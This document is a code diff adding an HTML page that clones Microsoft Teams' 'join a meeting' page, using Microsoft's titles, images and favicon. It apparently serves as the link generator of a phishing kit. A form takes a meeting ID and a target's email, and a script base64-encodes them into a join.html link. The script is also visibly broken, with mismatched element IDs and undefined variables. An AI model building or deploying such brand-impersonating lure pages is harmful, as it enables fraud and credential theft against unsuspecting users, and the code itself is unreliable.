@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en" class="ltr">
+   <head>
+      <meta charset="UTF-8">
+      <link rel="icon" type="image/svg+xml" href="/vite.svg">
+      <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+      <title>Join a Microsoft Teams Meeting by ID | Microsoft Teams</title>
+      <meta name="twitter:description" content="Learn how to join a Microsoft Teams meeting quickly and easily with just a meeting ID. Once you’re in, explore Teams features to make your meeting successful. ">
+      <meta name="twitter:card" content="summary">
+      <meta property="og:url" content="https://www.microsoft.com/en-gb/microsoft-teams/join-a-meeting">
+      <meta property="og:title" content="Join a Microsoft Teams Meeting by ID | Microsoft Teams">
+      <meta property="og:description" content="Learn how to join a Microsoft Teams meeting quickly and easily with just a meeting ID. Once you’re in, explore Teams features to make your meeting successful. ">
+      <meta property="og:type" content="website">
+
+      <link rel="stylesheet" href="./cloned-assets/index-CEJlkMXA.css">
+      <script src="./cloned-assets/index-BJ8PAfRR.js"></script>
+
+      <link rel="stylesheet" href="https://www.microsoft.com/onerfstatics/marketingsites-neu-prod/west-european/shell/_scrf/css/themes=default.device=uplevel_web_mobile_webkit_android/29-591900/68-c3a397/f4-0855a6/a8-3dc4a6/f1-3221a1/dc-d4cb46/1f-806835/44-c33a61?ver=2.0&amp;_cf=02242021_3231" type="text/css" media="all">
+      <link rel="shortcut icon" href="https://statics.teams.cdn.live.net/hashedassets-launcher/favicon/favicon.ico" type="image/x-icon">
+   </head>
+   <body>
+      <div id="root">
+         <div id="join-h323-sip" class="mini-layout" style="height: 65%; max-width: 480px; width: 100%; margin: 20vh auto auto;">
+            <div class="mini-layout-body">
+               <!-- Add the image here -->
+               <div style="text-align: center; margin-bottom: 20px;">
+                  <img src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31" alt="Microsoft Teams Image" style="max-width: 100%; height: auto;">
+               </div>
+               <!-- <div id="alertMsg" class="alert alert-danger hideme"></div> -->
+               <div class="page-header">
+                  <h1 style="font-size: 24px; text-align: center; margin-bottom: 10%;">Create Meeting</h1>
+               </div>
+               <form class="h323-sip-form" action="post">
+                  <div class="form-group confno">
+                     <div class="controls">
+                        <p class="desc" style="font-size: 12px; color: rgb(116, 116, 134);">Meeting ID or Personal Link Name</p>
+                     </div>
+                     <div class="controls">
+                        <label for="pairing_meeting" class="sr-only">Meeting ID</label>
+                        <input type="text" placeholder="Enter Meeting ID Name" autocomplete="off" class="form-control input-lg confno pairing-input" name="pairing_meeting" id="pairing_meeting">
+                     </div>
+                  </div>
+                  <div class="form-group">
+                     <div class="controls">
+                        <label for="pairing_code" class="sr-only">Enter Meeting Personal Email</label>
+                        <input type="text" placeholder="Enter Meeting Personal Email" autocomplete="off" class="form-control input-lg pairing-input" name="pairing_code" id="pairing_code">
+                     </div>
+                  </div>
+                  <div class="controls">
+                     <button class="btn btn-primary user submit" type="button" id="btnPairSubmit" style="width: 100%; padding: 10px;">Generate Link</button>
+                  </div>
+               </form>
+            </div>
+         </div>
+      </div>
+   </body>
+   <script type="text/javascript">
+      $("#addSubmit").on("click", function(){
+         console.log("testing the needful");
+         var meetingId = $('#upairing_meeting').val();
+         var pairingCode =  $('#pairing_code').val();
+
+         var meetingIdEncoded = encodeURIComponent(btoa(meetingId));
+         var pairingCodEncoded = encodeURIComponent(btoa(pairingCode));
+         if (email == "" || name == ""){
+            $("#contentt").html("please fill in all details completely");
+         }else{
+            var getUrl = window.location;
+            var baseUrl = getUrl .protocol + "//" + getUrl.host + "/";
+            console.log( getUrl .protocol + "//" + getUrl.host + "/");
+            var damage= 1 + Math.floor(Math.random() * 5);
+            $("#contentt").html(baseUrl + "join.html?value=" + damage.toString() + "&email=" + meetingIdEncoded + "&name=" + pairingCodEncoded);
+         }
+      });
+  </script>
+</html>
